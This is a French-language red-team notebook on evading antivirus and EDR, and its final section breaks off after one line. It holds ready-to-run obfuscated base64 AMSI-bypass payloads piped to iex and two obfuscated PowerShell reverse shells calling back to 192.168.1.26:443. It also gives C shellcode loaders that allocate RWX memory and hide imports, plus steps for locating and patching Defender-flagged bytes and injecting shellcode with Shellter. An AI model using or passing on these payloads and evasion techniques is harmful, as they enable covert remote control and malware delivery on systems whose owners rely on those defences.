
Méthodo :

Afin de bypasser l'AV / EDR, nous devons :

1. Contourner le mecanisme de sandbox -> Analyse comportementale.
2. Obfusquer / Chiffrer / cacher notre payload. -> Analyse statique
3. Obfusquer la table d'import (IAT) -> Analyse statique
4. Faire en sorte que la région de mémoire allouée ne soit pas en RWX. -> Analyse comportementale
5. Utiliser les syscalls indirect pour executer le shellcode afin de contourner le userland hooking des EDR. -> Analyse comportementale
6. Patcher l'AMSI pour exécuter du .NET... en post-exploit. -> Analyse statique
7. Patcher l'ETW pour que les évènements ne soient pas tracés. -> Analyse comportementale


- [[#Analyse Statique]]
	- [[#AMSI]]
	- [[#Obfusquer le payload]]
	- [[#Identifier l'offset d'un élément flag]]
	- [[#Obfusquer la Table d'imports (IAT)]]


- [[#Analyse comportementale]]
	- [[#EDRSilencer]]


# Analyse Statique
## AMSI

Anti Malware Scan Interface, permet d'inspecter le comportement des scripts en lisant le code en mémoire, la détection est statique.

La fonctionnalité AMSI est intégrée à ces composants de Windows 10 :
- Contrôle de compte d’utilisateur ou UAC (élévation d’EXE, COM, MSI ou installation ActiveX)
- PowerShell (scripts, utilisation interactive et évaluation dynamique du code)
- Hôte de script Windows (wscript.exe et cscript.exe)
- JavaScript et VBScript
- Macros VBA Office

Sauf que cette protection amsi.dll est chargée en mémoire du processus lancé par l'utilisateur dans une zone directement contrôlable par celui-ci.

Les différentes techniques de bypass ont pour objectif de réécrire les instructions de la DLL en mémoire pour casser la détection.

### AMSI Bypass

Liste de techniques :
https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell

#### AMSI Fail

https://amsi.fail/ -> Permet de générer des payloads obfusqués (Bien générer en encodé et tester jusqu'à ce que ça fonctionne) afin de patcher l'AMSI.

> [!Warning]
> Note : Fonctionne dans une session interactive mais pas en début d'un script plus long.
> Fonctionne pour patcher l'AMSI dans la session PowerShell uniquement, si besoin d'exécuter du .NET en mémoire, utiliser une méthode alternative afin de patcher l'AMSI dans le processus complet.

Windows 11

```powershell
[SYStEm.TExT.encOdIng]::uNIcODE.GetsTrIng([SySteM.conVERT]::fRomBAse64sTrIng("IwBNAGEAdAB0ACAARwByAGEAZQBiAGUAcgBzACAAcwBlAGMAbwBuAGQAIABSAGUAZgBsAGUAYwB0AGkAbwBuACAAbQBlAHQAaABvAGQAIAAKACQAYwA2AF8AYwBxAF8AMQBCAFcANgA3AHAAXwBuAFIATABnAEoAXwA9ACQAbgB1AGwAbAA7ACQASAA1AGoAcgBpAHQARABJAFoAVgBTAHcAbQB0AHYAVAA9ACIAUwB5AHMAdABlAG0ALgAkACgAKAAnAE0A4gBuAOMAJwArACcAZwDqAG0A6QAnACsAJwBuAHQAJwApAC4AbgBvAHIATQBBAGwAaQBaAGUAKABbAGMAaABhAHIAXQAoAFsAYgB5AFQARQBdADAAeAA0ADYAKQArAFsAYwBoAGEAcgBdACgAWwBCAFkAdABlAF0AMAB4ADYAZgApACsAWwBDAEgAYQByAF0AKABbAEIAWQB0AEUAXQAwAHgANwAyACkAKwBbAEMASABBAFIAXQAoADkAMwArADEANgApACsAWwBjAEgAYQBSAF0AKAA2ADgAKwA1ADkALQA1ADkAKQApACAALQByAGUAcABsAGEAYwBlACAAWwBjAGgAQQByAF0AKAA0ADcAKwA0ADUAKQArAFsAQwBIAEEAUgBdACgAMQAxADIAKwAxADAAMgAtADEAMAAyACkAKwBbAGMAaABhAHIAXQAoADEAMgAzACsANAA5AC0ANAA5ACkAKwBbAGMASABhAFIAXQAoADUANQArADIAMgApACsAWwBDAEgAQQBSAF0AKAAxADEAMAApACsAWwBDAGgAQQBSAF0AKAAxADIANQAqADcAMwAvADcAMwApACkALgAkACgAKAAnAMAA+QB0APUAbQAnACsAJwDgAHQA7gD1AG4AJwApAC4AbgBPAHIAbQBhAGwASQB6AGUAKABbAEMASABhAFIAXQAoAFsAQgBZAFQARQBdADAAeAA0ADYAKQArAFsAYwBIAGEAcgBdACgAWwBiAHkAdABlAF0AMAB4ADYAZgApACsAWwBjAGgAYQBSAF0AKABbAEIAeQB0AEUAXQAwAHgANwAyACkAKwBbAGMASABBAHIAXQAoADEAMAA5ACoANwAwAC8ANwAwACkAKwBbAGMAaABBAHIAXQAoADYAOAApACkAIAAtAHIAZQBwAGwAYQBjAGUAIABbAEMASABhAFIAXQAoAFsAYgBZAFQARQBdADAAeAA1AGMAKQArAFsAQwBoAEEAcgBdACgAWwBiAFkAdABlAF0AMAB4ADcAMAApACsAWwBjAEgAQQByAF0AKAAxADIAMwAqADgAMAAvADgAMAApACsAWwBDAGgAQQBSAF0AKAA3ADcAKQArAFsAYwBIAGEAcgBdACgAMQAxADAAKQArAFsAYwBoAGEAUgBdACgAWwBiAFkAdABlAF0AMAB4ADcAZAApACkALgAkACgAKAAnAMIAbQBzAO4A2wB0AOwAJwArACcAbABzACcAKQAuAE4AbwBSAE0AQQBsAGkAWgBlACgAWwBjAGgAYQByAF0AKABbAEIAWQBUAGUAXQAwAHgANAA2ACkAKwBbAGMAaABhAHIAXQAoADIAMgArADgAOQApACsAWwBDAEgAQQBSAF0AKAAzADAAKwA4ADQAKQArAFsAQwBoAEEAUgBdACgAMQAwADkAKQArAFsAYwBoAGEAUgBdACgANgA4ACoANQA3AC8ANQA3ACkAKQAgAC0AcgBlAHAAbABhAGMAZQAgAFsAQwBoAGEAcgBdACgAWwBCAHkAVABlAF0AMAB4ADUAYwApACsAWwBDAGgAQQByAF0AKAAxADEAMgAqADkAMwAvADkAMwApACsAWwBjAEgAQQByAF0AKABbAGIAeQBUAGUAXQAwAHgANwBiACkAKwBbAEMASABBAFIAXQAoADcANwAqADcAMwAvADcAMwApACsAWwBjAEgAQQByAF0AKABbAEIAWQBUAEUAXQAwAHgANgBlACkAKwBbAEMAaABhAFIAXQAoAFsAQgBZAFQARQBdADAAeAA3AGQAKQApACIAOwAkAHEAZgBxAHIAYwByAHoAcwBpAGUAcQB6AHoAaQA9ACIAKwBbAGMASABBAFIAXQAoAFsAQgB5AFQAZQBdADAAeAA2AGUAKQArAFsAQwBIAGEAUgBdACgAOQA3ACsAMQAxACkAKwBbAEMASABhAHIAXQAoADEAMQAxACkAKwBbAGMASABhAFIAXQAoAFsAYgB5AFQAZQBdADAAeAA2ADgAKQAiADsAWwBUAGgAcgBlAGEAZABpAG4AZwAuAFQAaAByAGUAYQBkAF0AOgA6AFMAbABlAGUAcAAoADcAMQA0ACkAOwBbAFIAdQBuAHQAaQBtAGUALgBJAG4AdABlAHIAbwBwAFMAZQByAHYAaQBjAGUAcwAuAE0AYQByAHMAaABhAGwAXQA6ADoAKAAiACQAKABbAGMASABBAFIAXQAoADgANwArADIANwAtADIANwApACsAWwBjAEgAYQBSAF0AKAAxADEANAArADUAMgAtADUAMgApACsAWwBjAEgAYQByAF0AKAAxADAANQApACsAWwBDAGgAYQBSAF0AKAA4ADMAKwAzADMAKQArAFsAQwBoAEEAcgBdACgAMQAwADEAKwA3ADQALQA3ADQAKQArAFsAQwBoAEEAUgBdACgAWwBCAHkAVABFAF0AMAB4ADQAOQApACsAWwBjAEgAYQByAF0AKAAxADEAMAArADEAMAAwAC0AMQAwADAAKQArAFsAQwBIAGEAUgBdACgAWwBCAFkAVABFAF0AMAB4ADcANAApACsAWwBDAEgAYQByAF0AKAA1ADEAKwAyAC0AMgApACsAWwBDAGgAYQBSAF0AKAA1ADAAKQApACIAKQAoAFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAKAAkAEgANQBqAHIAaQB0AEQASQBaAFYAUwB3AG0AdAB2AFQAKQAuAEcAZQB0AEYAaQBlAGwAZAAoACIAJAAoAFsAYwBoAGEAUgBdACgAOQA3ACoAOAA5AC8AOAA5ACkAKwBbAEMAaABhAFIAXQAoAFsAQgBZAHQARQBdADAAeAA2AGQAKQArAFsAYwBoAEEAcgBdACgAMQAxADUAKQArAFsAQwBIAEEAUgBdACgAMQAwADUAKwA3ADAALQA3ADAAKQArAFsAQwBIAEEAcgBdACgAWwBCAHkAVABlAF0AMAB4ADQAMwApACsAWwBDAEgAQQBSAF0AKABbAGIAWQBUAEUAXQAwAHgANgBmACkAKwBbAEMAaABhAFIAXQAoAFsAQgBZAFQAZQBdADAAeAA2AGUAKQArAFsAQwBoAEEAUgBdACgAMQAxADYAKgA3ADUALwA3ADUAKQArAFsAYwBoAGEAcgBdACgAMQAzACsAOAA4ACkAKwBbAEMASABBAFIAXQAoADEAMgAwACkAKwBbAGMASABhAHIAXQAoAFsAQgB5AFQAZQBdADAAeAA3ADQAKQApACIALABbAFIAZQBmAGwAZQBjAHQAaQBvAG4ALgBCAGkAbgBkAGkAbgBnAEYAbABhAGcAcwBdACIATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAiACkALgBHAGUAdABWAGEAbAB1AGUAKAAkAGMANgBfAGMAcQBfADEAQgBXADYANwBwAF8AbgBSAEwAZwBKAF8AKQAsADAAeAA0ADgAZQA0ADIAMgA5ADMAKQA7ACQAcgBlAGcAdQBiAGEAZwB0AHYAcgBjAHEAegBiAD0AIgArACgAJwD1AHIAbQBzAOgAeQAnACsAJwDoAHYAbQD7ACcAKQAuAG4ATwByAG0AQQBMAEkAWgBlACgAWwBjAGgAYQBSAF0AKAA3ADAAKQArAFsAQwBoAEEAcgBdACgAWwBCAFkAdABFAF0AMAB4ADYAZgApACsAWwBjAGgAQQByAF0AKABbAEIAeQBUAGUAXQAwAHgANwAyACkAKwBbAGMASABhAHIAXQAoAFsAQgBZAFQAZQBdADAAeAA2AGQAKQArAFsAQwBoAEEAUgBdACgAWwBCAHkAdABlAF0AMAB4ADQANAApACkAIAAtAHIAZQBwAGwAYQBjAGUAIABbAEMAaABhAFIAXQAoAFsAQgB5AFQAZQBdADAAeAA1AGMAKQArAFsAQwBoAGEAUgBdACgAWwBCAHkAVABlAF0AMAB4ADcAMAApACsAWwBjAGgAQQByAF0AKABbAEIAWQBUAEUAXQAwAHgANwBiACkAKwBbAEMAaABhAHIAXQAoADcAMQArADYAKQArAFsAYwBoAGEAcgBdACgAMQAxADAAKgA4ADgALwA4ADgAKQArAFsAQwBIAEEAcgBdACgANwA3ACsANAA4ACkAIgA7AFsAVABoAHIAZQBhAGQAaQBuAGcALgBUAGgAcgBlAGEAZABdADoAOgBTAGwAZQBlAHAAKAAxADIANQAyACkA"))|iex
```

Windows 10

```powershell
[SYstEm.text.ENCodING]::UnICoDE.getSTrIng([SYsTEM.ConVeRT]::FRoMbasE64StRiNG("IwBVAG4AawBuAG8AdwBuACAALQAgAEYAbwByAGMAZQAgAGUAcgByAG8AcgAgAAoAJAByAEIAOQB0AFYAcAA3ADAAYwBIAHAAZwBCAFEAZQBqADgAPQAkAG4AdQBsAGwAOwAkAFgAagAzAEYAYQBrAGYAaQB2AHEAYQBhADcASwA9AFsAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMALgBNAGEAcgBzAGgAYQBsAF0AOgA6AEEAbABsAG8AYwBIAEcAbABvAGIAYQBsACgAKAAxADYANQAwACsANwA0ADIANgApACkAOwAkAGoAegBiAG0AawBkAGYAawBzAHIAYgBsAHQAdABiAHMAbQBsAHYAZwBpAHEAPQAiACsAKAAnAHEA9QDzAGYAcAAnACsAJwBnAPQAYwD5AOoAJwArACcAZgBiAHcAZAB3ACcAKwAnAHEA+QB3AGoAcwAnACsAJwBjAGwAdwBiACcAKQAuAE4ATwByAG0AYQBMAEkAegBlACgAWwBjAEgAYQByAF0AKAA3ADAAKwA1ADYALQA1ADYAKQArAFsAYwBoAEEAUgBdACgAWwBiAHkAdABFAF0AMAB4ADYAZgApACsAWwBDAGgAYQByAF0AKABbAEIAeQBUAEUAXQAwAHgANwAyACkAKwBbAGMASABhAFIAXQAoADEAMAA5ACkAKwBbAEMAaABhAHIAXQAoAFsAYgBZAHQAZQBdADAAeAA0ADQAKQApACAALQByAGUAcABsAGEAYwBlACAAWwBjAGgAQQByAF0AKAA5ADIAKQArAFsAQwBIAGEAUgBdACgAMgAzACsAOAA5ACkAKwBbAGMASABBAHIAXQAoADEANQArADEAMAA4ACkAKwBbAGMASABhAHIAXQAoAFsAYgB5AHQARQBdADAAeAA0AGQAKQArAFsAYwBIAEEAUgBdACgAWwBiAFkAVABFAF0AMAB4ADYAZQApACsAWwBjAEgAYQBSAF0AKABbAEIAeQBUAEUAXQAwAHgANwBkACkAIgA7AFsAVABoAHIAZQBhAGQAaQBuAGcALgBUAGgAcgBlAGEAZABdADoAOgBTAGwAZQBlAHAAKAA0ADAAKQA7AFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAKAAiAFMAeQBzAHQAZQBtAC4AJAAoAFsAQwBIAEEAUgBdACgAWwBiAFkAVABlAF0AMAB4ADQAZAApACsAWwBjAGgAQQBSAF0AKAA5ADcAKgA5ADQALwA5ADQAKQArAFsAQwBIAEEAUgBdACgAMwA2ACsANwA0ACkAKwBbAGMAaABBAFIAXQAoAFsAYgB5AHQAZQBdADAAeAA2ADEAKQArAFsAQwBoAGEAcgBdACgAMQAwADMAKQArAFsAQwBoAEEAcgBdACgAMQAwADEAKgA1ADYALwA1ADYAKQArAFsAQwBoAEEAUgBdACgAMwA1ACsANwA0ACkAKwBbAEMAaABBAFIAXQAoAFsAQgB5AHQARQBdADAAeAA2ADUAKQArAFsAQwBIAGEAUgBdACgAWwBiAHkAVABlAF0AMAB4ADYAZQApACsAWwBDAEgAYQByAF0AKABbAGIAeQB0AGUAXQAwAHgANwA0ACkAKQAuACQAKAAoACcAxAD7AHQA9QBtACcAKwAnAOMAdADsAPQAbgAnACkALgBuAE8AUgBtAGEATABJAHoAZQAoAFsAQwBIAGEAUgBdACgAWwBCAHkAdABlAF0AMAB4ADQANgApACsAWwBjAGgAQQBSAF0AKAAxADEAMQAqADIANwAvADIANwApACsAWwBjAGgAYQBSAF0AKAA0ADUAKwA2ADkAKQArAFsAQwBoAGEAcgBdACgAMQAwADkAKQArAFsAYwBoAGEAUgBdACgAMwAyACsAMwA2ACkAKQAgAC0AcgBlAHAAbABhAGMAZQAgAFsAYwBoAEEAcgBdACgAWwBiAFkAVABlAF0AMAB4ADUAYwApACsAWwBDAEgAYQByAF0AKAAxADEAMgAqADUAMAAvADUAMAApACsAWwBjAGgAQQByAF0AKABbAGIAeQBUAEUAXQAwAHgANwBiACkAKwBbAGMAaABhAFIAXQAoAFsAYgB5AHQAZQBdADAAeAA0AGQAKQArAFsAQwBoAGEAUgBdACgAWwBCAFkAVABlAF0AMAB4ADYAZQApACsAWwBDAEgAQQByAF0AKAAxADIANQAqADQAMwAvADQAMwApACkALgAkACgAWwBjAEgAYQBSAF0AKAA2ADUAKQArAFsAYwBoAGEAUgBdACgAMQAwADMAKwA2ACkAKwBbAEMAaABhAHIAXQAoAFsAYgBZAFQARQBdADAAeAA3ADMAKQArAFsAQwBIAEEAUgBdACgAWwBiAFkAdABlAF0AMAB4ADYAOQApACsAWwBjAGgAQQByAF0AKAA0ADMAKwA0ADIAKQArAFsAQwBIAGEAcgBdACgAWwBCAHkAVABlAF0AMAB4ADcANAApACsAWwBjAEgAYQByAF0AKAAxADAANQArADUAOAAtADUAOAApACsAWwBDAGgAYQByAF0AKABbAGIAWQB0AEUAXQAwAHgANgBjACkAKwBbAGMAaABBAHIAXQAoAFsAYgB5AFQARQBdADAAeAA3ADMAKQApACIAKQAuAEcAZQB0AEYAaQBlAGwAZAAoACIAJAAoAFsAYwBoAEEAUgBdACgAWwBiAFkAVABFAF0AMAB4ADYAMQApACsAWwBjAEgAQQBSAF0AKABbAEIAeQB0AGUAXQAwAHgANgBkACkAKwBbAGMASABBAFIAXQAoAFsAQgBZAHQARQBdADAAeAA3ADMAKQArAFsAQwBIAGEAUgBdACgAMQAwADUAKgA2ADMALwA2ADMAKQArAFsAQwBIAGEAcgBdACgANgA0ACsAMQA5ACkAKwBbAEMAaABBAFIAXQAoADIANQArADcANgApACsAWwBDAEgAQQByAF0AKABbAEIAWQB0AEUAXQAwAHgANwAzACkAKwBbAEMASABBAHIAXQAoADEAMQA1ACsAMQAyAC0AMQAyACkAKwBbAEMAaABhAFIAXQAoADIANAArADgAMQApACsAWwBDAEgAQQByAF0AKAA1ACsAMQAwADYAKQArAFsAQwBoAGEAUgBdACgAWwBiAFkAVABlAF0AMAB4ADYAZQApACkAIgAsACAAIgBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACIAKQAuAFMAZQB0AFYAYQBsAHUAZQAoACQAcgBCADkAdABWAHAANwAwAGMASABwAGcAQgBRAGUAagA4ACwAIAAkAHIAQgA5AHQAVgBwADcAMABjAEgAcABnAEIAUQBlAGoAOAApADsAWwBSAGUAZgBdAC4AQQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQAVAB5AHAAZQAoACIAUwB5AHMAdABlAG0ALgAkACgAWwBDAEgAQQBSAF0AKABbAGIAWQBUAGUAXQAwAHgANABkACkAKwBbAGMAaABBAFIAXQAoADkANwAqADkANAAvADkANAApACsAWwBDAEgAQQBSAF0AKAAzADYAKwA3ADQAKQArAFsAYwBoAEEAUgBdACgAWwBiAHkAdABlAF0AMAB4ADYAMQApACsAWwBDAGgAYQByAF0AKAAxADAAMwApACsAWwBDAGgAQQByAF0AKAAxADAAMQAqADUANgAvADUANgApACsAWwBDAGgAQQBSAF0AKAAzADUAKwA3ADQAKQArAFsAQwBoAEEAUgBdACgAWwBCAHkAdABFAF0AMAB4ADYANQApACsAWwBDAEgAYQBSAF0AKABbAGIAeQBUAGUAXQAwAHgANgBlACkAKwBbAEMASABhAHIAXQAoAFsAYgB5AHQAZQBdADAAeAA3ADQAKQApAC4AJAAoACgAJwDEAPsAdAD1AG0AJwArACcA4wB0AOwA9ABuACcAKQAuAG4ATwBSAG0AYQBMAEkAegBlACgAWwBDAEgAYQBSAF0AKABbAEIAeQB0AGUAXQAwAHgANAA2ACkAKwBbAGMAaABBAFIAXQAoADEAMQAxACoAMgA3AC8AMgA3ACkAKwBbAGMAaABhAFIAXQAoADQANQArADYAOQApACsAWwBDAGgAYQByAF0AKAAxADAAOQApACsAWwBjAGgAYQBSAF0AKAAzADIAKwAzADYAKQApACAALQByAGUAcABsAGEAYwBlACAAWwBjAGgAQQByAF0AKABbAGIAWQBUAGUAXQAwAHgANQBjACkAKwBbAEMASABhAHIAXQAoADEAMQAyACoANQAwAC8ANQAwACkAKwBbAGMAaABBAHIAXQAoAFsAYgB5AFQARQBdADAAeAA3AGIAKQArAFsAYwBoAGEAUgBdACgAWwBiAHkAdABlAF0AMAB4ADQAZAApACsAWwBDAGgAYQBSAF0AKABbAEIAWQBUAGUAXQAwAHgANgBlACkAKwBbAEMASABBAHIAXQAoADEAMgA1ACoANAAzAC8ANAAzACkAKQAuACQAKABbAGMASABhAFIAXQAoADYANQApACsAWwBjAGgAYQBSAF0AKAAxADAAMwArADYAKQArAFsAQwBoAGEAcgBdACgAWwBiAFkAVABFAF0AMAB4ADcAMwApACsAWwBDAEgAQQBSAF0AKABbAGIAWQB0AGUAXQAwAHgANgA5ACkAKwBbAGMAaABBAHIAXQAoADQAMwArADQAMgApACsAWwBDAEgAYQByAF0AKABbAEIAeQBUAGUAXQAwAHgANwA0ACkAKwBbAGMASABhAHIAXQAoADEAMAA1ACsANQA4AC0ANQA4ACkAKwBbAEMAaABhAHIAXQAoAFsAYgBZAHQARQBdADAAeAA2AGMAKQArAFsAYwBoAEEAcgBdACgAWwBiAHkAVABFAF0AMAB4ADcAMwApACkAIgApAC4ARwBlAHQARgBpAGUAbABkACgAIgAkACgAKAAnAOQAbQBzAO0AJwArACcAQwD0AG4AdAAnACsAJwDpAHgAdAAnACkALgBOAE8AcgBtAEEAbABJAFoAZQAoAFsAYwBoAEEAcgBdACgANwAwACkAKwBbAGMASABBAFIAXQAoAFsAYgBZAFQARQBdADAAeAA2AGYAKQArAFsAYwBoAEEAcgBdACgAMQAxADQAKQArAFsAYwBoAEEAUgBdACgAMQAwADkAKgA0ADQALwA0ADQAKQArAFsAYwBoAEEAUgBdACgANgA4ACsAMQA5AC0AMQA5ACkAKQAgAC0AcgBlAHAAbABhAGMAZQAgAFsAYwBoAGEAUgBdACgAOQAyACoANgAxAC8ANgAxACkAKwBbAGMAaABBAFIAXQAoADEAMQAyACsAOQAtADkAKQArAFsAQwBIAGEAcgBdACgAWwBCAHkAVABFAF0AMAB4ADcAYgApACsAWwBDAGgAYQByAF0AKAA3ADcAKwA3ADAALQA3ADAAKQArAFsAYwBIAGEAcgBdACgAMQAxADAAKQArAFsAQwBIAGEAUgBdACgAMQAyADUAKQApACIALAAgACIATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAiACkALgBTAGUAdABWAGEAbAB1AGUAKAAkAHIAQgA5AHQAVgBwADcAMABjAEgAcABnAEIAUQBlAGoAOAAsACAAWwBJAG4AdABQAHQAcgBdACQAWABqADMARgBhAGsAZgBpAHYAcQBhAGEANwBLACkAOwAkAHkAawBsAHQAYgB0AHYAPQAiACsAKAAnAHoAJwArACcAYwAnACsAJwBjACcAKwAnAPkAJwApAC4AbgBvAFIAbQBhAGwASQBaAGUAKABbAGMASABBAFIAXQAoADcAMAArADQALQA0ACkAKwBbAEMAaABhAFIAXQAoADEAMQAxACsAMQA5AC0AMQA5ACkAKwBbAGMASABhAFIAXQAoAFsAQgBZAHQAZQBdADAAeAA3ADIAKQArAFsAQwBIAEEAcgBdACgAMQA4ACsAOQAxACkAKwBbAGMASABBAHIAXQAoAFsAQgBZAHQARQBdADAAeAA0ADQAKQApACAALQByAGUAcABsAGEAYwBlACAAWwBDAGgAQQByAF0AKAA1ADkAKwAzADMAKQArAFsAQwBIAEEAUgBdACgAWwBCAHkAVABlAF0AMAB4ADcAMAApACsAWwBDAGgAYQBSAF0AKABbAGIAWQBUAGUAXQAwAHgANwBiACkAKwBbAGMAaABBAFIAXQAoADcANwAqADYAMgAvADYAMgApACsAWwBDAGgAYQBSAF0AKABbAGIAWQBUAEUAXQAwAHgANgBlACkAKwBbAEMAaABBAFIAXQAoAFsAQgB5AHQAZQBdADAAeAA3AGQAKQAiADsAWwBUAGgAcgBlAGEAZABpAG4AZwAuAFQAaAByAGUAYQBkAF0AOgA6AFMAbABlAGUAcAAoADUANAApAA=="))|iex
```



### AMSITrigger

Identifier le morceau de code PowerShell detecté comme étant malveillant :
https://github.com/RythmStick/AMSITrigger


### Invoke-Obfuscation

Script PowerShell qui permet d'obfusquer les scripts powershell automatiquement.
https://github.com/danielbohannon/Invoke-Obfuscation

```
import-module .\Invoke-Obfuscation.psd1
Invoke-Obfuscation
```

Set le script block avec notre script

```
SET SCRIPTBLOCK '$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("%%DATA%%"));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();'
```

ou bien le scriptpath avec le chemin absolu de notre script

```
SET SCRIPTPATH /home/kali/winPEAS.ps1
```

Puis choisir une méthode d'obfuscation.

Fonctionne bien -> Tout ce qui est dans Token, possible d'appliquer ALL plusieurs fois.

**Token\string\2**  -> **Token\command\3** -> **Token\argument\4**  ->  **Token\member\4** -> **Token\variable\1** -> **Token\type\2** ->  **Token\whitespace\1**

Puis utile d'utiliser la compression, le string reverse ou l'encodage une fois le tout obfusqué. (éviter de faire les 2 car defender le détecte).


Reverse shells qui bypassent l'AMSI

```powershell
$client = &("{0}{1}{2}" -f'Ne','w-Ob','ject') System.Net.Sockets.TCPClient("192.168.1.26",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|.('%'){0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (.("{1}{2}{0}"-f'ct','New-O','bje') -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (.("{0}{1}" -f'i','ex') $data 2>&1 | .("{2}{0}{1}"-f 't-','String','Ou') );$sendback2 = $sendback + "PS " + (.("{1}{0}"-f 'wd','p')).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

```powershell
$client = &("{1}{2}{0}" -f 'ct','New-','Obje') ("{2}{5}{6}{4}{0}{1}{3}"-f's.T','C','S','PClient','ocket','y','stem.Net.S')("192.168.1.26",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|.('%'){0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (.("{2}{1}{0}" -f'ct','bje','New-O') -TypeName ("{3}{2}{5}{4}{1}{0}" -f 'ng','codi','Text','System.','IIEn','.ASC')).GetString($bytes,0, $i);$sendback = (.("{1}{0}"-f'x','ie') $data 2>&1 | &("{1}{2}{0}" -f'ng','Ou','t-Stri') );$sendback2 = $sendback + "PS " + (&("{1}{0}"-f'd','pw')).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```


---
## Obfusquer le payload

On peut simplement chiffrer notre shellcode en XOR et le déchiffrer lors de l'exécution du programme par exemple -> [[Shellcode Generation & Encryption]]




---
## Identifier l'offset d'un élément flag

### ThreatCheck

> [!TIP]
> Permet d'identifier l'offset de l'élément flag par la detection statique de Defender.
> Nécessite un defender fonctionnel...

https://github.com/rasta-mouse/ThreatCheck

1. Analyser un programme et noter l'offset.

executable

```
.\ThreatCheck.exe -f .\artifact64big.exe
```

script powershell (AMSI)

```
.\ThreatCheck.exe -f .\template.x64.ps1 -e amsi
```


Puis décompiler avec [Ghidra](https://www.ghidra-sre.org/)

1. Lancer Ghidra

```
ghidraRun.bat
```

2. Créer un projet : File -> New Project

3. Importer notre exe : File -> Import File

4. Double cliquer sur le fichier importé et l'analyser : (yes) -> laisser les analysers par défaut -> Analyze.

5. Jump sur l'offset : Navigation -> Go To -> entrer file(offset_identifié) -> OK.

6. Highlight la dernière hex value retournée par ThreatCheck.

7. Modifier le code


---
## Obfusquer la Table d'imports (IAT)

L' IAT (Import Adress Table) est une structure de données qui contient des informations à propos des APIs et fonctions appelées par notre programme.

L'Antivirus analyse les informations présentes dans cette table lors de l'analyse statique afin de détecter si des fonctions telles que VirtualAlloc(), WriteProcessMemory() ... sont appelées par le programme.

Pour contourner ceci on peut implémenter du "Dynamic Linking", afin de récupérer l'adresse mémoire des fonctions qui nous intéressent lors de l'exécution du programme au lieu de les coder en dur dans notre PE. De cette manière aucune fonction potentiellement malveillante ne se situera dans la table d'import.

> [!Warning]
> Une autre manière de faire est de faire du "Static Linking" en compilant le PE en version standalone (Multithread /MT) afin que toutes les fonctions de kernel32.dll soient directement compilées dans le programme. Les fonctions apparaitront dans la table d'import mais étant donné qu'elles sont toutes importées ça ne parait pas suspect du point de vue de DEFENDER en tout cas.

https://cirosec.de/en/news/loader-dev-2-dynamically-resolving-functions/


- [[#Afficher la table d'import d'un binaire / DLL]]
- [[#Static Linking]]
- [[#Dynamic Linking]]

### Afficher la table d'import d'un binaire / DLL

On peut afficher la table d'imports d'un binaire avec le tool "DumpBin" de Visual Studio (CMD).

```cmd
"C:\Program Files (x86)\Microsoft Visual Studio\2017\BuildTools\VC\Tools\MSVC\14.16.27023\bin\Hostx64\x64\dumpbin.exe" /IMPORTS C:\Users\Amadeus\Desktop\Projects\ClassicInject\x64\Release\ClassicInject.exe
```

Ici on voit nos fonctions VirtualAlloc, WriteProcessMemory etc...

![[Pasted image 20251118181902.png]]
### Static Linking

 Dans les propriétés du projet dans Visual Studio -> Définir la bibliothèque Runtime MultiThread (/MT).

![[Pasted image 20251120025445.png]]

On peut voir qu'absolument toutes les fonctions sont dans la table d'import

![[Pasted image 20251120032633.png]]

### Dynamic Linking

Exemple de Dynamic Linking de la fonction VirtualAlloc :

Au lieu d'appeler directement VirtualAlloc comme ceci.

```C
void *hMemory = VirtualAlloc(0, sizeof code, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
  
memcpy(hMemory, code, sizeof code);
  
((void(*)())hMemory)();
  
return 0;
```


On créer un type de fonction pointeur ressemblant à VirtualAlloc :

```C
// On créer un type de fonction pointeur ressemblant à VirtualAlloc, qu'on nomme VirtualAlloc_t
typedef LPVOID(WINAPI* VirtualAlloc_t)(LPVOID, SIZE_T, DWORD, DWORD); 

// On charge Kernel32, récupère l'adresse de la fonction VirtualAlloc et on la met dans le pointeur de fonction pVirtualAlloc.
VirtualAlloc_t pVirtualAlloc =(VirtualAlloc_t)GetProcAddress(GetModuleHandleA("kernel32.dll"), "VirtualAlloc"); 

// On alloue un espace memoire en RWX avec pVirtualAlloc au lieu de VirtualAlloc
unsigned char* hMemory = pVirtualAlloc(NULL, sizeof code, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

// On copie le shellcode dedans
memcpy(hMemory, code, sizeof code);

// On execute le shellcode
((void(*)())hMemory)();
```


Ici on voit que VirtualAlloc a disparu de la table d'imports

![[Pasted image 20251120032804.png]]





---
### Shellter

> [!Tip]
> Permet d'injecter du shellcode dans un PE.
> A lancer avec Wine.

> [!Warning]
> Ne fonctionne que sur des exécutables 32bit
> Detecté maintenant :(


installer shellter et wine32 bit

```
sudo apt install shelter
sudo dpkg --add-architecture i386 && sudo apt-get update &&
sudo apt-get install wine32:i386
sudo cp -r /home/kali/.wine/root/
```


Lancer shellter

```
sudo wine shellter.exe
```


---
# Analyse comportementale


## Analyse des allocations mémoire

1. Exécuter le payload.
